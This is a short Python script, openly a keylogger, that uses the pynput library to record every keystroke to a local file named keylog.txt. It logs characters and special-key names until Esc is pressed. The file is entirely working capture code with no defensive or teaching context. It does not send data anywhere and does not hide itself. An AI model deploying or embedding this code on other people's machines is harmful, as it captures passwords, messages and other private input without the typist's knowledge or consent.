import os
from pynput import keyboard

# Specify the file where the keystrokes will be saved
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
            else:
                f.write(f'[{key.name}]')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Ensure the log file is in the current working directory
if not os.path.isfile(log_file):
    with open(log_file, 'w') as f:
        f.write("Keylog Start\n")

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
